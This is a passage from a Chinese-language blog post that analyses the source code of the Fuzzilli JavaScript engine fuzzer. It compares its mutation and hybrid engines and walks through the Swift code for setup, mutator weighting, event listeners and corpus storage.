该模板成功地在数亿次执行中再次触发了原始漏洞，从而证明了该技术是可行的。</p><h4 id="Application-Targeted-Fuzzing"><a href="#Application-Targeted-Fuzzing" class="headerlink" title="Application: Targeted Fuzzing"></a>Application: Targeted Fuzzing</h4><p>此应用与前一个应用类似，不同之处在于它不是从现有错误开始的。 相反，安全研究人员或开发人员必须首先确定目标引擎中可能容易出现复杂错误的特定功能，然后开发一个模板来尽可能好地强调该组件。</p><p>与第一个应用相比，这种模板需要对目标源代码区域有相当深入的了解，例如，为了确定需要生成哪些类型的代码片段以及不需要生成哪些类型的代码片段。 另一方面，它应该效率更高。</p><h4 id="MutationEngine-vs-HybridEngine"><a href="#MutationEngine-vs-HybridEngine" class="headerlink" title="MutationEngine vs. HybridEngine"></a>MutationEngine vs. HybridEngine</h4><p>本节简要比较Fuzzilli中使用的两种引擎。</p><table><thead><tr><th>MutationEngine</th><th>HybridEngine</th></tr></thead><tbody><tr><td>遵循通用指导算法，几乎不需要手动调整即可生成有趣的 JavaScript 代码</td><td>需要手动指导，以程序模板和代码生成器形式</td></tr><tr><td>生成的样本对控制的余地很小，因为它们主要是由覆盖率反馈决定的。影响代码的可能方法包括代码生成器及其相对权重、突变体以及最小化器的侵略性。</td><td>允许对生成的代码有大量控制，包括对高级结构（例如，一个正在 JIT 编译的函数，然后被调用几次）以及通过代码生成器对低级代码片段的控制</td></tr><tr><td>能够发现与样本“相似”的漏洞，从而触发新的覆盖率（因此被添加到语料库中），但可能难以发现不是这种情况的漏洞。后者可能包括需要通过多个不同的代码路径进行复杂状态操作的漏洞</td><td>能够找到与所使用的 ProgramTemplates 之一“相似”的漏洞，这些模板可能来自过去的漏洞、希望测试特定区域的开发者或希望测试代码库复杂区域的审计员</td></tr></tbody></table><p>由于这两个引擎相互补充，因此可能需要在同一个模糊测试会话中同时运行这两个引擎。 至少在理论上，这两个引擎也应该能够相互受益：变异引擎可以进一步变异来自 HybridEngine 的样本，而 HybridEngine 可以（通过拼接）从由 MutationEngine 构建的更好的语料库中受益。 因此，MultiEngine（<code>--engine=multi</code>）允许在一个模糊测试会话中使用这两个引擎，并允许大致控制每个引擎的调度频率。</p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>一次周期内，Fuzzilli的执行流分析。</p><h3 id="基本架构：由main-swift开始"><a href="#基本架构：由main-swift开始" class="headerlink" title="基本架构：由main.swift开始"></a>基本架构：由main.swift开始</h3><p><code>FUZZILLI/Sources/FuzzilliCli/main.swift</code>主要是对参数的读取、初始化、以及启动Fuzz loop。</p><p>创建好CodeGenerator加权列表用于后续的随机选择：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">// 是否启用WasmCodeGenerator</span><br><span class="hljs-keyword">let</span> codeGeneratorsToUse <span class="hljs-operator">=</span> <span class="hljs-keyword">if</span> enableWasm &#123;<br>    <span class="hljs-type">CodeGenerators</span> <span class="hljs-operator">+</span> <span class="hljs-type">WasmCodeGenerators</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-type">CodeGenerators</span><br>&#125; <br><span class="hljs-comment">// 设置CodeGenerator权重</span><br><span class="hljs-keyword">let</span> standardCodeGenerators: [(<span class="hljs-type">CodeGenerator</span>, <span class="hljs-type">Int</span>)] <span class="hljs-operator">=</span> codeGeneratorsToUse.map &#123;<br>    <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> weight <span class="hljs-operator">=</span> codeGeneratorWeights[<span class="hljs-variable">$0</span>.name] <span class="hljs-keyword">else</span> &#123;<br>        logger.fatal(<span class="hljs-string">&quot;Missing weight for code generator <span class="hljs-subst">\(<span class="hljs-variable">$0</span>.name)</span> in CodeGeneratorWeights.swift&quot;</span>)<br>    &#125;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-variable">$0</span>, weight)<br>&#125;<br><span class="hljs-comment">// 创建一个空的加权列表来存储CodeGenerator</span><br><span class="hljs-keyword">var</span> codeGenerators: <span class="hljs-type">WeightedList</span>&lt;<span class="hljs-type">CodeGenerator</span>&gt; <span class="hljs-operator">=</span> <span class="hljs-type">WeightedList</span>&lt;<span class="hljs-type">CodeGenerator</span>&gt;([])<br><span class="hljs-comment">// 遍历所有Generator，跳过被禁用的Generator</span><br><span class="hljs-keyword">for</span> (generator, <span class="hljs-keyword">var</span> weight) <span class="hljs-keyword">in</span> (additionalCodeGenerators <span class="hljs-operator">+</span> standardCodeGenerators) &#123;<br>    <span class="hljs-keyword">if</span> disabledGenerators.contains(generator.name) &#123;<br>        <span class="hljs-keyword">continue</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> swarmTesting &#123;<br>        weight <span class="hljs-operator">=</span> <span class="hljs-type">Int</span>.random(in: <span class="hljs-number">1</span><span class="hljs-operator">...</span><span class="hljs-number">30</span>)<br>        logger.info(<span class="hljs-type">String</span>(format: <span class="hljs-string">&quot;%6d | <span class="hljs-subst">\(generator.name)</span>&quot;</span>, weight))<br>    &#125;<br><br>    codeGenerators.append(generator, withWeight: weight)<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来是<code>loadCorpus</code>函数的定义，用于从指定目录加载文件。生成的programs是该目录下的文件列表</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">func</span> <span class="hljs-title function_">loadCorpus</span>(<span class="hljs-params">from</span> <span class="hljs-params">dirPath</span>: <span class="hljs-type">String</span>) -&gt; [<span class="hljs-type">Program</span>] &#123;<br>    <span class="hljs-keyword">var</span> isDir: <span class="hljs-type">ObjCBool</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">guard</span> <span class="hljs-type">FileManager</span>.default.fileExists(atPath: dirPath, isDirectory: <span class="hljs-operator">&amp;</span>isDir) <span class="hljs-operator">&amp;&amp;</span> isDir.boolValue <span class="hljs-keyword">else</span> &#123;<br>        logger.fatal(<span class="hljs-string">&quot;Cannot import programs from <span class="hljs-subst">\(dirPath)</span>, it is not a directory!&quot;</span>)<br>    &#125;<br><br>    <span class="hljs-keyword">var</span> programs <span class="hljs-operator">=</span> [<span class="hljs-type">Program</span>]()<br>    <span class="hljs-keyword">let</span> fileEnumerator <span class="hljs-operator">=</span> <span class="hljs-type">FileManager</span>.default.enumerator(atPath: dirPath)<br>    <span class="hljs-comment">// 遍历目录的每个文件</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">let</span> filename <span class="hljs-operator">=</span> fileEnumerator<span class="hljs-operator">?</span>.nextObject() <span class="hljs-keyword">as?</span> <span class="hljs-type">String</span> &#123;<br>        <span class="hljs-keyword">guard</span> filename.hasSuffix(<span class="hljs-string">&quot;.fzil&quot;</span>) <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">continue</span> &#125;<br>        <span class="hljs-keyword">let</span> path <span class="hljs-operator">=</span> dirPath <span class="hljs-operator">+</span> <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-operator">+</span> filename<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-keyword">let</span> data <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-type">Data</span>(contentsOf: <span class="hljs-type">URL</span>(fileURLWithPath: path))<br>            <span class="hljs-keyword">let</span> pb <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-type">Fuzzilli_Protobuf_Program</span>(serializedBytes: data)<br>            <span class="hljs-keyword">let</span> program <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-type">Program</span>.<span class="hljs-keyword">init</span>(from: pb)<br>            <span class="hljs-keyword">if</span> <span class="hljs-operator">!</span>program.isEmpty &#123;<br>                programs.append(program)<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> &#123;<br>            logger.error(<span class="hljs-string">&quot;Failed to load program <span class="hljs-subst">\(path)</span>: <span class="hljs-subst">\(error)</span>. Skipping&quot;</span>)<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> programs<br>&#125;<br></code></pre></td></tr></table></figure><p>然后是<code>makeFuzzer</code>函数，这个函数的定义很长，用来初始化并配置一个Fuzzer示例，代码就不放了。简单分析一下：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">func</span> <span class="hljs-title function_">makeFuzzer</span>(<span class="hljs-params">with</span> <span class="hljs-params">configuration</span>: <span class="hljs-type">Configuration</span>) -&gt; <span class="hljs-type">Fuzzer</span><br></code></pre></td></tr></table></figure><ul><li>作用：根据传入的<code>Configuration</code>配置，构建并返回一个完整的Fuzzer实例。</li></ul><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">let</span> runner <span class="hljs-operator">=</span> <span class="hljs-type">REPRL</span>(executable: jsShellPath, processArguments: jsShellArguments, processEnvironment: profile.processEnv, maxExecsBeforeRespawn: profile.maxExecsBeforeRespawn) <span class="hljs-comment">// 在插桩的JavaScript引擎中运行测试代码。</span><br></code></pre></td></tr></table></figure><p>REPRL为在被插装的JS引擎中执行js代码的script runner</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">// 为各个变异器分配权重，如（ExplorationMutator权重为3，更频繁使用）。</span><br><span class="hljs-comment">// mutator负责根据语料库变异程序并且评估结果</span><br><span class="hljs-keyword">var</span> mutators <span class="hljs-operator">=</span> <span class="hljs-type">WeightedList</span>([<br>        (<span class="hljs-type">ExplorationMutator</span>(),                 <span class="hljs-number">3</span>),<br>        (<span class="hljs-type">CodeGenMutator</span>(),                     <span class="hljs-number">2</span>),<br>        (<span class="hljs-type">SpliceMutator</span>(),                      <span class="hljs-number">2</span>),<br>        (<span class="hljs-type">ProbingMutator</span>(),                     <span class="hljs-number">2</span>),<br>        (<span class="hljs-type">InputMutator</span>(typeAwareness: .loose),  <span class="hljs-number">2</span>),<br>        (<span class="hljs-type">InputMutator</span>(typeAwareness: .aware),  <span class="hljs-number">1</span>),<br>        <span class="hljs-comment">// Can be enabled for experimental use, ConcatMutator is a limited version of CombineMutator</span><br>        <span class="hljs-comment">// (ConcatMutator(),                   1),</span><br>        (<span class="hljs-type">OperationMutator</span>(),                   <span class="hljs-number">1</span>),<br>        (<span class="hljs-type">CombineMutator</span>(),                     <span class="hljs-number">1</span>),<br>        <span class="hljs-comment">// Include this once it does more than just remove unneeded try-catch</span><br>        <span class="hljs-comment">// (FixupMutator()),                   1),</span><br>    ])<br></code></pre></td></tr></table></figure><p>前面的文档中提及过的FuzzEngine：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">switch</span> engineName &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;hybrid&quot;</span>:<br>    engine <span class="hljs-operator">=</span> <span class="hljs-type">HybridEngine</span>(numConsecutiveMutations: consecutiveMutations)<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;multi&quot;</span>:<br>    <span class="hljs-keyword">let</span> mutationEngine <span class="hljs-operator">=</span> <span class="hljs-type">MutationEngine</span>(numConsecutiveMutations: consecutiveMutations)<br>    <span class="hljs-keyword">let</span> hybridEngine <span class="hljs-operator">=</span> <span class="hljs-type">HybridEngine</span>(numConsecutiveMutations: consecutiveMutations)<br>    <span class="hljs-keyword">let</span> engines <span class="hljs-operator">=</span> <span class="hljs-type">WeightedList</span>&lt;<span class="hljs-type">FuzzEngine</span>&gt;([<br>        (mutationEngine, <span class="hljs-number">1</span>),<br>        (hybridEngine, <span class="hljs-number">1</span>),<br>    ])<br></code></pre></td></tr></table></figure><p>其余的还有程序模板（ProgramTemplates），<code>JavaScriptEnvironment</code>是管理可用的内置函数、属性名和方法名，可以通过配置文件来添加自定义内置函数。<code>ProgramCoverageEvaluator</code>接收覆盖率数据。还有lifter，Corpus以及Minimizer。就不赘述了。</p><p>然后是调用Configuration函数进行配置信息的初始化：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">let</span> mainConfig <span class="hljs-operator">=</span> <span class="hljs-type">Configuration</span>(arguments: <span class="hljs-type">CommandLine</span>.arguments,<br>                               timeout: <span class="hljs-type">UInt32</span>(timeout),<br>                               logLevel: logLevel,<br>                               startupTests: profile.startupTests,<br>                               minimizationLimit: minimizationLimit,<br>                               enableDiagnostics: diagnostics,<br>                               enableInspection: inspect,<br>                               staticCorpus: staticCorpus,<br>                               tag: tag)<br></code></pre></td></tr></table></figure><p>再调用makeFuzzer函数以config来创建一个Fuzzer实例。再初始化信号处理器，在接收到终止信号时能够优雅地关闭fuzzer（这是一种标准的Swift信号处理模式，适用于需要优雅地退出的命令行工具或服务）。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">// Install signal handlers to terminate the fuzzer gracefully.</span><br><span class="hljs-keyword">var</span> signalSources: [<span class="hljs-type">DispatchSourceSignal</span>] <span class="hljs-operator">=</span> []<br><span class="hljs-keyword">for</span> sig <span class="hljs-keyword">in</span> [<span class="hljs-type">SIGINT</span>, <span class="hljs-type">SIGTERM</span>] &#123;<br>    <span class="hljs-comment">// Seems like we need this so the dispatch sources work correctly?</span><br>    signal(sig, <span class="hljs-type">SIG_IGN</span>)<br><br>    <span class="hljs-keyword">let</span> source <span class="hljs-operator">=</span> <span class="hljs-type">DispatchSource</span>.makeSignalSource(signal: sig, queue: <span class="hljs-type">DispatchQueue</span>.main)<br>    source.setEventHandler &#123;<br>        fuzzer.async &#123;<br>            fuzzer.shutdown(reason: .userInitiated)<br>        &#125;<br>    &#125;<br>    source.activate()<br>    signalSources.append(source)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后<code>fuzzer.sync</code>，它初始化关键模块（统计数据，存储，网络同步等）。网络同步是分布式模糊测试，支持多机协同（主节点发 任务，子节点执行），随后又一个<code>ThreadParent(for: fuzzer)</code>多线程并行，最后三步是<code>fuzzer.initialize()</code>初始化所有模块，<code>fuzzer.runStartupTests()</code>运行基础测试，确保各个模块，引擎等正常工作。最后<code>fuzzer.start(runUntil: exitCondition)</code>，启动fuzz loop。</p><p>首先看一下Fuzzer对象的<code>ShutDownComplete</code>事件对象上挂载了一个回调函数（称为<code>listener</code>），用于在Fuzzer退出时做一些收尾工作</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs swift">fuzzer.sync &#123;   <span class="hljs-comment">// 向fuzzer的dispath queue发送一个回调函数, 并等待任务完成 </span><br>    <span class="hljs-operator">...</span><br><br>    <span class="hljs-comment">// 当主fuzzer完全停止时, 退出这个进程</span><br>    fuzzer.registerEventListener(for: fuzzer.events.<span class="hljs-type">ShutdownComplete</span>) &#123; reason <span class="hljs-keyword">in</span><br>        <span class="hljs-keyword">if</span> resume, <span class="hljs-keyword">let</span> path <span class="hljs-operator">=</span> storagePath &#123;<br>            <span class="hljs-comment">// Check if we have an old_corpus directory on disk, this can happen if the user Ctrl-C&#x27;s during an import.</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-type">FileManager</span>.default.fileExists(atPath: path <span class="hljs-operator">+</span> <span class="hljs-string">&quot;/old_corpus&quot;</span>) &#123;<br>                logger.info(<span class="hljs-string">&quot;Corpus import aborted. The old corpus is now in <span class="hljs-subst">\(path <span class="hljs-operator">+</span> <span class="hljs-string">&quot;/old_corpus&quot;</span>)</span>.&quot;</span>)<br>                logger.info(<span class="hljs-string">&quot;You can recover the old corpus by moving it to <span class="hljs-subst">\(path <span class="hljs-operator">+</span> <span class="hljs-string">&quot;/corpus&quot;</span>)</span>.&quot;</span>)<br>            &#125;<br>        &#125;<br>        exit(reason.toExitCode())    <span class="hljs-comment">// 整个进程退出, 所有线程被kill</span><br>    &#125;<br>    <span class="hljs-operator">...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>进一步了解<code>Fuzzer</code>的事件机制</p><p><code>Event&lt;T&gt;</code>类的定义如下，发现<code>Event</code>其实是一个<code>listener</code>容器，表示该事件发生时所有要回调的<code>listener</code>，<code>T</code>则代表回调函数的参数类型</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Event</span>&lt;<span class="hljs-type">T</span>&gt; &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">typealias</span> <span class="hljs-type">EventListener</span> <span class="hljs-operator">=</span> (<span class="hljs-type">T</span>) -&gt; <span class="hljs-type">Void</span><span class="hljs-comment">// 事件监听器也就是listener的类型</span><br><br>    <span class="hljs-comment">/// The list of observers for this event.// 所有监听该事件的listener组成的数组</span><br>    <span class="hljs-keyword">private(set)</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">var</span> listeners <span class="hljs-operator">=</span> [<span class="hljs-type">EventListener</span>]()<br><br>    <span class="hljs-comment">/// Registers an event listener for this event.// 向该事件中注册listener</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">addListener</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">listener</span>: <span class="hljs-keyword">@escaping</span> <span class="hljs-type">EventListener</span>) &#123;<br>        listeners.append(listener)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Events</code>则是各种类型的集合，包含所有可以被分派给fuzzer的事件，部分事件如下</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">/// List of all events that can be dispatched in a fuzzer.</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Events</span> &#123;<br>    <span class="hljs-comment">/// Signals that the fuzzer is fully initialized. fuzzer被完全初始化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> <span class="hljs-type">Initialized</span> <span class="hljs-operator">=</span> <span class="hljs-type">Event</span>&lt;<span class="hljs-type">Void</span>&gt;()<br><br>    <span class="hljs-comment">/// Signals that a this instance is shutting down.fuzzer即将被关闭</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> <span class="hljs-type">Shutdown</span> <span class="hljs-operator">=</span> <span class="hljs-type">Event</span>&lt;<span class="hljs-type">ShutdownReason</span>&gt;()<br><br>    <span class="hljs-comment">/// Signals that this instance has successfully shut down.fuzzer被成功关闭</span><br>    <span class="hljs-comment">/// Clients are expected to terminate the hosting process when handling this event.</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> <span class="hljs-type">ShutdownComplete</span> <span class="hljs-operator">=</span> <span class="hljs-type">Event</span>&lt;<span class="hljs-type">ShutdownReason</span>&gt;()<br><br>    <span class="hljs-comment">/// Signals that a log message was dispatched.一个日志信息被发送</span><br>    <span class="hljs-comment">/// The origin field contains the UUID of the fuzzer instance that originally logged the message.</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> <span class="hljs-type">Log</span> <span class="hljs-operator">=</span> <span class="hljs-type">Event</span>&lt;(origin: <span class="hljs-type">UUID</span>, level: <span class="hljs-type">LogLevel</span>, label: <span class="hljs-type">String</span>, message: <span class="hljs-type">String</span>)&gt;()<br><br>    <span class="hljs-comment">/// Signals that a new (mutated) program has been generated.一个新的（变异后的）程序被生成</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> <span class="hljs-type">ProgramGenerated</span> <span class="hljs-operator">=</span> <span class="hljs-type">Event</span>&lt;<span class="hljs-type">Program</span>&gt;()<br><br>    <span class="hljs-comment">/// Signals that a valid program has been found.一个合法程序被发现</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> <span class="hljs-type">ValidProgramFound</span> <span class="hljs-operator">=</span> <span class="hljs-type">Event</span>&lt;<span class="hljs-type">Program</span>&gt;()<br><br>&#125;<br></code></pre></td></tr></table></figure><p>因此<code>fuzzer.registerEventListener()</code>其实就是把<code>listener</code>回调添加到<code>event.listeners</code>数组中</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">registerEventListener</span>&lt;<span class="hljs-type">T</span>&gt;(<span class="hljs-params">for</span> <span class="hljs-params">event</span>: <span class="hljs-type">Event</span>&lt;<span class="hljs-type">T</span>&gt;, <span class="hljs-params">listener</span>: <span class="hljs-keyword">@escaping</span> <span class="hljs-type">Event</span>&lt;<span class="hljs-type">T</span>&gt;.<span class="hljs-type">EventListener</span>) &#123;<br>    dispatchPrecondition(condition: .onQueue(queue))<br>    event.addListener(listener)<br>&#125;<br></code></pre></td></tr></table></figure><p>listener被触发的流程：</p><ul><li>以<code>ShutdownComplete</code>时间为例，在fuzz循环次数到达限制或者时间到达限制后会调用<code>Fuzzer::shutdown()</code>方法退出fuzz</li><li>该方法会执行<code>dispatchEvent(events.ShudownComplete, data: reason)</code>表示以参数<code>data</code>触发<code>ShutdownComplete</code>事件对象上的所有listener</li><li>而<code>dispatchEvent()</code>会直接回调<code>event.listeners</code>数组中所有的事件监听器</li></ul><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">// Store samples to disk if requested.</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> path <span class="hljs-operator">=</span> storagePath &#123;<span class="hljs-comment">// 把生成的样本保存在磁盘中， 参数--storagePath被设置时</span><br>    <span class="hljs-keyword">if</span> resume &#123;<span class="hljs-comment">// 恢复模式：将旧语料库移动到old_corpus，并后续导入</span><br>        <span class="hljs-comment">// Move the old corpus to a new directory from which the files will be imported afterwards</span><br>        <span class="hljs-comment">// before the directory is deleted.</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-type">FileManager</span>.default.fileExists(atPath: path <span class="hljs-operator">+</span> <span class="hljs-string">&quot;/old_corpus&quot;</span>) &#123;<br>            logger.fatal(<span class="hljs-string">&quot;Unexpected /old_corpus directory found! Was a previous import aborted? Please check if you need to recover the old corpus manually by moving to to /corpus or deleting it.&quot;</span>)<br>        &#125;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-keyword">try</span> <span class="hljs-type">FileManager</span>.default.moveItem(atPath: path <span class="hljs-operator">+</span> <span class="hljs-string">&quot;/corpus&quot;</span>, toPath: path <span class="hljs-operator">+</span> <span class="hljs-string">&quot;/old_corpus&quot;</span>)<br>        &#125; <span class="hljs-keyword">catch</span> &#123;<br>            logger.info(<span class="hljs-string">&quot;Nothing to resume from: <span class="hljs-subst">\(path)</span>/corpus does not exist&quot;</span>)<br>            resume <span class="hljs-operator">=</span> <span class="hljs-literal">false</span><br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> overwrite &#123;<span class="hljs-comment">// 覆盖模式：清空存储目录</span><br>        logger.info(<span class="hljs-string">&quot;Deleting all files in <span class="hljs-subst">\(path)</span> due to --overwrite&quot;</span>)<br>        <span class="hljs-keyword">try?</span> <span class="hljs-type">FileManager</span>.default.removeItem(atPath: path)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// The corpus directory must be empty. We already checked this above, so just assert here</span><br>        <span class="hljs-keyword">let</span> directory <span class="hljs-operator">=</span> (<span class="hljs-keyword">try?</span> <span class="hljs-type">FileManager</span>.default.contentsOfDirectory(atPath: path <span class="hljs-operator">+</span> <span class="hljs-string">&quot;/corpus&quot;</span>)) <span class="hljs-operator">??</span> []<br>        <span class="hljs-built_in">assert</span>(directory.isEmpty)<br>    &#125;<br><span class="hljs-comment">// 添加存储模块</span><br>    fuzzer.addModule(<span class="hljs-type">Storage</span>(for: fuzzer,<br>                             storageDir: path,<br>                             statisticsExportInterval: exportStatistics <span class="hljs-operator">?</span> <span class="hljs-type">Double</span>(statisticsExportInterval) <span class="hljs-operator">*</span> Minutes : <span class="hljs-literal">nil</span><br>                            ))<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p><code>Storage</code>模块：负责将测试用例和Crash数据存储到磁盘中。</p></blockquote><p>下面研究一下什么是模块，<code>Module</code>接口的定义如下，该接口只要求实现一个<code>initialize()</code>方法，该方法会在<code>Fuzzer</code>的对象初始化完毕之后回调，用于进行模块初始化</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">extension</span> <span class="hljs-title class_">Module</span> &#123;<br>    <span class="hljs-comment">// initialize()方法会在fuzzer完全完全初始化并且能够执行程序时调用</span><br>    <span class="hljs-comment">// 此时，其他模块将要被初始化但是还没有完全初始化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">with</span> <span class="hljs-params">fuzzer</span>: <span 